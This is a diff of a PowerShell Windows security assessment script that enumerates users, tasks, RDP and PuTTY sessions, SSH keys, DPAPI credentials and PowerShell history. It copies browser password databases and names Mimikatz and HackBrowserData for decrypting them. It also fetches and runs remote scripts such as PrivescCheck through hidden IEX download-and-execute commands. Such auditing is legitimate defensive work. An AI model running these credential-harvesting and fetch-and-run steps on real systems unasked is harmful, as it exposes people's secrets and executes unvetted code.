+$combined += "=== LOGGED ON USERS ==="
+$combined += $loggedUsers
 $combined | Out-File "$OUT\users_and_admins.txt" -Encoding utf8
-Write-Host "[OK]   Users & Admins -> users_and_admins.txt" -ForegroundColor Green
+Write-Host "[ OK ]   Users & Admins -> users_and_admins.txt" -ForegroundColor Green
+if ($loggedUsers.Count -gt 1) {
+    Write-Host "           - [P140] Multiple users are logged on" -ForegroundColor DarkRed
+}
 
 # DNS Cache
 $noisePatterns = 'microsoft\.com|windows\.com|akamai\.|trafficmanager\.net|msn\.com|office\.com|office365\.com|skype\.com|live\.com|bing\.com|msftncsi\.com|msftconnecttest\.com|windowsupdate\.com|github\.com|githubusercontent\.com|akadns\.net|edgesuite\.net|edgekey\.net|akamaiedge\.net|fastly\.net|globalcdn\.co|gcdn\.co|xboxservices\.com|azure\.com|azureedge\.net|smartscreen\.microsoft|digicert\.com|msedge\.net|msidentity\.com|dsp\.mp\.microsoft|delivery\.mp\.microsoft|qwilted-cds\.cqloud\.com'
@@ -648,9 +656,9 @@ foreach ($block in $blocks) {
 }
 if ($interesting.Count -gt 0) {
     $interesting | Out-File "$OUT\dns_cache.txt" -Encoding utf8
-    Write-Host "[KO]   ($($interesting.Count)) unknown DNS cache entries -> dns_cache.txt" -ForegroundColor DarkRed
+    Write-Host "[P145]   $($interesting.Count) unknown DNS cache entries -> dns_cache.txt" -ForegroundColor DarkRed
 } else {
-    Write-Host "[OK]   DNS cache contains only known domains" -ForegroundColor Green
+    Write-Host "[ OK ]   DNS cache contains only known domains" -ForegroundColor Green
 }
 
 # Scheduled Tasks (filtered)
@@ -676,9 +684,9 @@ foreach ($task in $allTasks) {
 }
 if ($suspicious.Count -gt 0) {
     $suspicious | Format-Table -AutoSize | Out-File "$OUT\scheduled_tasks.txt" -Encoding utf8
-    Write-Host "[KO]   $($suspicious.Count) suspicious scheduled task(s) -> scheduled_tasks.txt" -ForegroundColor DarkRed
+    Write-Host "[P147]   $($suspicious.Count) suspicious scheduled task(s) -> scheduled_tasks.txt" -ForegroundColor DarkRed
 } else {
-    Write-Host "[OK]   No suspicious scheduled tasks found" -ForegroundColor Green
+    Write-Host "[ OK ]   No suspicious scheduled tasks found" -ForegroundColor Green
 }
 
 # Startup items (filtered)
@@ -687,9 +695,9 @@ $startupOutput = Get-CimInstance Win32_StartupCommand |
     Format-Table -AutoSize
 if ($startupOutput) {
     $startupOutput | Out-File "$OUT\startup_items.txt" -Encoding utf8
-    Write-Host "[KO]   Startup items found -> startup_items.txt" -ForegroundColor Red
+    Write-Host "[P150]   Startup items found -> startup_items.txt" -ForegroundColor DarkRed
 } else {
-    Write-Host "[OK]   No non-standard startup items found" -ForegroundColor Green
+    Write-Host "[ OK ]   No non-standard startup items found" -ForegroundColor Green
 }
 
 # Check WSL
@@ -698,17 +706,17 @@ try {
     $wsl = $wslJob | Wait-Job -Timeout 5 | Receive-Job
     Remove-Job $wslJob -Force
     if ($wsl -match "NAME") {
-        Write-Host "[KO]   WSL is installed and has distributions" -ForegroundColor DarkRed
+        Write-Host "[P155]   WSL is installed and has distributions" -ForegroundColor DarkRed
         foreach ($line in $wsl) {
             if ($line -match "\S") {
-                Write-Host "       $line" -ForegroundColor DarkGray
+                Write-Host "             $line" -ForegroundColor DarkGray
             }
         }
     } else {
-        Write-Host "[OK]   WSL is not installed or no distributions" -ForegroundColor Green
+        Write-Host "[ OK ]   WSL is not installed or no distributions" -ForegroundColor Green
     }
 } catch {
-    Write-Host "[OK]   WSL is not installed or no distributions" -ForegroundColor Green
+    Write-Host "[ OK ]   WSL is not installed or no distributions" -ForegroundColor Green
 }
 
 # MSI repairing
@@ -723,62 +731,61 @@ $msiOutput = Get-WmiObject -Class Win32_Product |
     }
 if ($msiOutput) {
     $msiOutput | Out-File "$OUT\msi_list.txt" -Encoding utf8
-    Write-Host "[KO]   MSI repair LPE possible -> msi_list.txt" -ForegroundColor DarkRed
+    Write-Host "[P160]   MSI repair LPE possible -> msi_list.txt" -ForegroundColor DarkRed
 } else {
-    Write-Host "[OK]   No MSI repair LPE vectors found" -ForegroundColor Green
+    Write-Host "[ OK ]   No MSI repair LPE vectors found" -ForegroundColor Green
 }
 
 Write-Host ""
-
 
 # RDP connections
 try {
     $rdp = reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" 2>$null
     if ($rdp -match "MRU") {
-        Write-Host "[KO]   RDP saved servers found -> rdp_servers.txt" -ForegroundColor DarkRed
+        Write-Host "[P165]   RDP saved servers found -> rdp_servers.txt" -ForegroundColor DarkRed
         $rdp | Out-File "$OUT\rdp_servers.txt"
     } else {
-        Write-Host "[OK]   No saved RDP servers found" -ForegroundColor Green
+        Write-Host "[ OK ]   No saved RDP servers found" -ForegroundColor Green
     }
 } catch {
-    Write-Host "[--]   RDP enumeration failed" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   RDP enumeration failed" -ForegroundColor DarkYellow
 }
 
 # PuTTY sessions
 try {
     $putty = reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>$null
     if ($putty -match "Sessions") {
-        Write-Host "[KO]   PuTTY sessions configured -> putty_sessions.txt" -ForegroundColor DarkRed
+        Write-Host "[P170]   PuTTY sessions configured -> putty_sessions.txt" -ForegroundColor DarkRed
         $putty | Out-File "$OUT\putty_sessions.txt"
     } else {
-        Write-Host "[OK]   No PuTTY sessions found" -ForegroundColor Green
+        Write-Host "[ OK ]   No PuTTY sessions found" -ForegroundColor Green
     }
 } catch {
-    Write-Host "[??]   PuTTY enumeration skipped" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   PuTTY enumeration skipped" -ForegroundColor DarkYellow
 }
 
 # DPAPI Artefacts Check
 try {
     $dpapi = Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -ErrorAction SilentlyContinue
     if ($dpapi -and $dpapi.Count -gt 0) {
-        Write-Host "[??]   DPAPI encrypted credentials found ($($dpapi.Count))" -ForegroundColor DarkYellow
-        Write-Host "       - Use SharpDPAPI or Mimikatz for decryption" -ForegroundColor DarkGray
+        Write-Host "[P175]   DPAPI encrypted credentials found ($($dpapi.Count))" -ForegroundColor DarkYellow
+        Write-Host "             - Use SharpDPAPI or Mimikatz for decryption" -ForegroundColor DarkGray
     } else {
-        Write-Host "[OK]   No DPAPI credentials found" -ForegroundColor Green
+        Write-Host "[ OK ]   No DPAPI credentials found" -ForegroundColor Green
     }
 } catch {
-    Write-Host "[OK]   DPAPI check skipped" -ForegroundColor Green
+    Write-Host "[ OK ]   DPAPI check skipped" -ForegroundColor Green
 }
 
 # SSH keys
 if (Test-Path "$env:USERPROFILE\.ssh") {
-    Write-Host "[KO]   SSH keys found -> ssh_keys.txt" -ForegroundColor DarkRed
+    Write-Host "[P180]   SSH keys found -> ssh_keys.txt" -ForegroundColor DarkRed
     Get-ChildItem "$env:USERPROFILE\.ssh" | Out-File "$OUT\ssh_keys.txt"
 } else {
-    Write-Host "[OK]   No SSH keys found" -ForegroundColor Green
+    Write-Host "[ OK ]   No SSH keys found" -ForegroundColor Green
 }
 
-# Browser creds check, edge bigger than 0
+# Browser creds check
 $browserPaths = @{
     "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
     "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
@@ -815,10 +822,10 @@ foreach ($browser in $browserPaths.Keys) {
     }
 }
 if ($found.Count -gt 0) {
-    Write-Host "[KO]   Browser credential stores found: $($found -join ', ') -> db copied to output" -ForegroundColor DarkRed
-    Write-Host "       - Decrypt with HackBrowserData: https://github.com/moonD4rk/HackBrowserData" -ForegroundColor DarkGray
+    Write-Host "[P185]   Browser credential stores found: $($found -join ', ') -> db copied to output" -ForegroundColor DarkRed
+    Write-Host "          - Decrypt with HackBrowserData: https://github.com/moonD4rk/HackBrowserData" -ForegroundColor DarkGray
 } else {
-    Write-Host "[OK]   No browser credential stores found" -ForegroundColor Green
+    Write-Host "[ OK ]   No browser credential stores found" -ForegroundColor Green
 }
 
 # PowerShell history
@@ -827,12 +834,12 @@ if (Test-Path $histFile) {
     Copy-Item $histFile "$OUT\powershell_history.txt" -ErrorAction SilentlyContinue
     $sensitive = Select-String -Path $histFile -Pattern "password|passwd|pwd|pass=|api.?key|token|secret|credential|auth|login" -ErrorAction SilentlyContinue
     if ($sensitive) {
-        Write-Host "[KO]   There might be sensitive commands in PowerShell history -> powershell_history.txt" -ForegroundColor DarkRed
+        Write-Host "[P190]   Sensitive commands in PowerShell history -> powershell_history.txt" -ForegroundColor DarkRed
     } else {
-        Write-Host "[OK]   PowerShell history found -> powershell_history.txt" -ForegroundColor Green
+        Write-Host "[ OK ]   PowerShell history found -> powershell_history.txt" -ForegroundColor Green
     }
 } else {
-    Write-Host "[OK]   No PowerShell history found" -ForegroundColor Green
+    Write-Host "[ OK ]   No PowerShell history found" -ForegroundColor Green
 }
 
 Write-Host ""
@@ -849,13 +856,13 @@ try {
     Pop-Location
 
     if ($pingOutput -match "not connected to a domain|couldn't guess the domain") {
-        Write-Host "[--]   PingCastle: Computer is not connected to a domain" -ForegroundColor DarkYellow
+        Write-Host "[ -- ]   PingCastle: Computer is not connected to a domain" -ForegroundColor DarkYellow
     } else {
         Move-Item -Path "$pingCastleDir\*.html" -Destination "$OUT\PingCastle.html" -Force -ErrorAction SilentlyContinue
-        Write-Host "[OK]   PingCastle -> PingCastle.html (3.4.2.66, last version before Netwrix October 2025)" -ForegroundColor Green
+        Write-Host "[ OK ]   PingCastle -> PingCastle.html (3.4.2.66, last version before Netwrix October 2025)" -ForegroundColor Green
     }
 } catch {
-    Write-Host "[--]   PingCastle failed: $_" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   PingCastle failed: $_" -ForegroundColor DarkYellow
 }
 
 # ADeleginator
@@ -866,18 +873,18 @@ try {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/techspence/ADeleginator/main/Invoke-ADeleginator.ps1" -OutFile "$adelegDir\Invoke-ADeleginator.ps1" -UseBasicParsing -ErrorAction Stop
     $cmd = "Set-Location '$adelegDir'; . '$adelegDir\Invoke-ADeleginator.ps1'; Invoke-ADeleginator *>&1 | Where-Object { `$_ -notmatch 'Go, go|ADeleginator|diddle|by: Spencer|____' } | Out-File '$OUT\adeleginator.txt' -Encoding utf8"
     Start-Process powershell -ArgumentList "-NoProfile -Command `"$cmd`"" -WindowStyle Hidden -Wait
-    Write-Host "[OK]   ADeleginator -> adeleginator.txt" -ForegroundColor Green
+    Write-Host "[ OK ]   ADeleginator -> adeleginator.txt" -ForegroundColor Green
 } catch {
-    Write-Host "[--]   ADeleginator failed: $_" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   ADeleginator failed: $_" -ForegroundColor DarkYellow
 }
 
 # ScriptSentry
 try {
     $cmd = "IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/techspence/ScriptSentry/main/Invoke-ScriptSentry.ps1').Content; Invoke-ScriptSentry *>&1 | Out-File '$OUT\scriptsentry.txt' -Encoding utf8"
     Start-Process powershell -ArgumentList "-NoProfile -Command `"$cmd`"" -WindowStyle Hidden -Wait
-    Write-Host "[OK]   ScriptSentry -> scriptsentry.txt" -ForegroundColor Green
+    Write-Host "[ OK ]   ScriptSentry -> scriptsentry.txt" -ForegroundColor Green
 } catch {
-    Write-Host "[--]   ScriptSentry failed: $_" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   ScriptSentry failed: $_" -ForegroundColor DarkYellow
 }
 
 # HardeningKitty
@@ -894,18 +901,18 @@ try {
     Pop-Location
     $filtered = $output | Where-Object { $_ -notmatch '^\[!\]' -and $_ -notmatch '^\[+\]' -and $_ -notmatch 'Severity=Low' -and $_ -notmatch 'Severity=Passed' }
     $filtered | Out-File "$OUT\HardeningKitty.txt" -Encoding utf8
-    Write-Host "[OK]   HardeningKitty (Medium+ only) -> HardeningKitty.txt" -ForegroundColor Green
+    Write-Host "[ OK ]   HardeningKitty (Medium+ only) -> HardeningKitty.txt" -ForegroundColor Green
 } catch {
-    Write-Host "[--]   HardeningKitty failed: $_" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   HardeningKitty failed: $_" -ForegroundColor DarkYellow
 }
 
 # PrivescCheck
 try {
     $cmd = "IEX (New-Object Net.WebClient).DownloadString('https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report '$OUT\PrivescCheck' -Format HTML"
     Start-Process powershell -ArgumentList "-NoProfile -Command `"$cmd`"" -WindowStyle Hidden -Wait
-    Write-Host "[OK]   PrivescCheck -> PrivescCheck.html" -ForegroundColor Green
+    Write-Host "[ OK ]   PrivescCheck -> PrivescCheck.html" -ForegroundColor Green
 } catch {
-    Write-Host "[--]   PrivescCheck failed: $_" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   PrivescCheck failed: $_" -ForegroundColor DarkYellow
 }
 
 Write-Host ""
